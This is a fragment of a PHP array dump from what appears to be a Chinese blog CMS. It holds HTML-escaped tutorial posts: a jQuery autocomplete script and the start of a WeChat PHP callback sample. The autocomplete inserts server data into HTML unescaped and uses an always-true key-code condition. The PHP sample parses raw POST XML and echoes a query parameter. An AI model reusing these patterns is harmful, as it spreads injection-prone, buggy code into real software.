&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;enter_var&nbsp;=&nbsp;1;&nbsp;//回车变量(用于区分是汉字输入字母按下enter【enter_var&nbsp;=&nbsp;1】;还是按上下键然后按下enter【enter_var&nbsp;=&nbsp;2】选择&lt;li&gt;元素)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//布局div&nbsp;关键词显示域
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;search_div
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.css(&quot;border&quot;,&quot;1px&nbsp;solid&nbsp;black&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.css(&quot;position&quot;,&quot;absolute&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.css(&quot;top&quot;,search_word.offset().top+search_word.height()+6+&quot;px&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.css(&quot;left&quot;,search_word.offset().left+&quot;px&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.css(&quot;width&quot;,search_word.width()+4+&quot;px&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.hide();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//清除提示内容
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;clearContent&nbsp;=&nbsp;function(){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(search_ul&nbsp;!=&nbsp;null){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;search_ul.find(&quot;li&quot;).remove();//删除ul元素下所有子节点
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(search_div&nbsp;!=&nbsp;null){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;search_div.hide();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//显示内容
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;setContent&nbsp;=&nbsp;function(theContent){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;clearContent();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;search_div.show();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(str&nbsp;in&nbsp;theContent){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$(&quot;&lt;li&gt;&quot;+theContent[str]+&quot;&lt;/li&gt;&quot;).appendTo(search_ul);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//li元素被单击选中&nbsp;和&nbsp;鼠标滑过有特效
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;search_ul.find(&quot;li&quot;).click(function(){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;search_word.val($(this).text());
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;clearContent();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}).hover(
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;()&nbsp;{&nbsp;$(this).addClass(&quot;mouseOver&quot;);},
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;()&nbsp;{&nbsp;$(this).removeClass(&quot;mouseOver&quot;);}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//ajax同步到数据
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;search_word.keyup(function(event){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;event&nbsp;=&nbsp;event&nbsp;||&nbsp;window.event;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;key_code&nbsp;=&nbsp;event.keyCode;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//if((key_code&nbsp;&gt;=&nbsp;65&nbsp;&amp;&amp;&nbsp;key_code&nbsp;&lt;=&nbsp;90)&nbsp;||&nbsp;key_code&nbsp;==&nbsp;8&nbsp;||&nbsp;key_code&nbsp;==&nbsp;46&nbsp;||&nbsp;key_code&nbsp;==&nbsp;32&nbsp;||&nbsp;(key_code&nbsp;==&nbsp;13&nbsp;&amp;&amp;&nbsp;enter_var&nbsp;==&nbsp;1)){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(key_code!=38&nbsp;||&nbsp;key_code!=40&nbsp;||&nbsp;key_code!=13){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(search_word.val().length&nbsp;&gt;&nbsp;0){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;search_str&nbsp;=&nbsp;search_word.val();//拿到用户输入的词
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$.ajax({
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;type&nbsp;:&nbsp;&quot;get&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;url&nbsp;:&nbsp;&quot;search.php&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dataType&nbsp;:&nbsp;&quot;json&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;:&nbsp;{search_word&nbsp;:&nbsp;search_str},
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;success&nbsp;:&nbsp;function(data){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(data&nbsp;!==&nbsp;null){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setContent(data);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else&nbsp;if(data&nbsp;==&nbsp;null){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;clearContent();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;});
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;clearContent();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else&nbsp;if(key_code&nbsp;==&nbsp;38&nbsp;||&nbsp;key_code&nbsp;==&nbsp;40){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(key_code&nbsp;==&nbsp;38){//按向上键
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;autoLiNode&nbsp;=&nbsp;search_ul.find(&quot;li&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(li_index&nbsp;!=&nbsp;-1){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;autoLiNode.eq(li_index).removeClass(&quot;mouseOver&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;li_index--;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;li_index&nbsp;=&nbsp;autoLiNode.length-1;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(li_index&nbsp;==&nbsp;-1){//如果到顶&nbsp;高亮移动到最后一个
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;li_index&nbsp;=&nbsp;autoLiNode.length-1;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;autoLiNode.eq(li_index).addClass(&quot;mouseOver&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;context&nbsp;=&nbsp;autoLiNode.eq(li_index).text();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;search_word.val(context);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;enter_var&nbsp;=&nbsp;2;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else&nbsp;if(key_code&nbsp;==&nbsp;40){//按向下键
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;autoLiNode&nbsp;=&nbsp;search_ul.find(&quot;li&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(li_index&nbsp;!=&nbsp;-1){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;autoLiNode.eq(li_index).removeClass(&quot;mouseOver&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;li_index++;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(li_index&nbsp;==&nbsp;autoLiNode.length){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;li_index&nbsp;=&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;autoLiNode.eq(li_index).addClass(&quot;mouseOver&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;context&nbsp;=&nbsp;autoLiNode.eq(li_index).text();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;search_word.val(context);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;enter_var&nbsp;=&nbsp;2;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else&nbsp;if(key_code&nbsp;==&nbsp;13&nbsp;&amp;&amp;&nbsp;enter_var&nbsp;==&nbsp;2){//输入回车
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(li_index&nbsp;!=&nbsp;-1){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;context&nbsp;=&nbsp;search_ul.find(&quot;li&quot;).eq(li_index).text();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;clearContent();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;li_index&nbsp;=&nbsp;-1;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;search_word.val(context);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;enter_var&nbsp;=&nbsp;1;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;});
&nbsp;&nbsp;&nbsp;&nbsp;});</pre><p><br/></p>',
            'keyword' => 'jquery,ajax,文本框,自动完成',
            'sortid' => '7',
            'img' => '',
            'views' => '1',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 16:30:40',
          ),
          39 => 
          array (
            'id' => '46',
            'uid' => '1',
            'title' => '微信公众平台开发PHP版',
            'content' => '<p>1.在微信公众平台测试版申请账号</p><p>　　http://mp.weixin.qq.com/debug/cgi-bin/sandboxinfo?action=showinfo&amp;t=sandbox/index</p><p>URL填写你的服务器域名地址，Token随便写。</p><p><img src=\\"/public/upload/image/20150921/1442814942117635.png\\" title=\\"1442814942117635.png\\" alt=\\"161546315917144.png\\"/></p><p>2.http://mp.weixin.qq.com/wiki/index.php?title=%E6%B6%88%E6%81%AF%E6%8E%A5%E5%8F%A3%E6%8C%87%E5%8D%97</p><p>　　下载最下面的示例代码，打开，复制文件内容，到服务器文件上。</p><pre class=\\"brush:php;toolbar:false\\">&lt;?php
/**
&nbsp;&nbsp;*&nbsp;wechat&nbsp;php&nbsp;test
&nbsp;&nbsp;*/

//define&nbsp;your&nbsp;token
define(&quot;TOKEN&quot;,&nbsp;&quot;woshihaoren&quot;);　//这里改成你前面填写的
$wechatObj&nbsp;=&nbsp;new&nbsp;wechatCallbackapiTest();
$wechatObj-&gt;valid();

class&nbsp;wechatCallbackapiTest
{
&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;valid()
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$echoStr&nbsp;=&nbsp;$_GET[&quot;echostr&quot;];

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//valid&nbsp;signature&nbsp;,&nbsp;option
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($this-&gt;checkSignature()){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;$echoStr;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;responseMsg();//后加的调用那个函数
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}

&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;responseMsg()
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//get&nbsp;post&nbsp;data,&nbsp;May&nbsp;be&nbsp;due&nbsp;to&nbsp;the&nbsp;different&nbsp;environments
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$postStr&nbsp;=&nbsp;$GLOBALS[&quot;HTTP_RAW_POST_DATA&quot;];

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//extract&nbsp;post&nbsp;data
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!empty($postStr)){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$postObj&nbsp;=&nbsp;simplexml_load_string($postStr,&nbsp;&#39;SimpleXMLElement&#39;,&nbsp;LIBXML_NOCDATA);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$fromUsername&nbsp;=&nbsp;$postObj-&gt;FromUserName;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$toUsername&nbsp;=&nbsp;$postObj-&gt;ToUserName;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$keyword&nbsp;=&nbsp;trim($postObj-&gt;Content);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$time&nbsp;=&nbsp;time();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$textTpl&nbsp;=&nbsp;&quot;&lt;xml&gt;
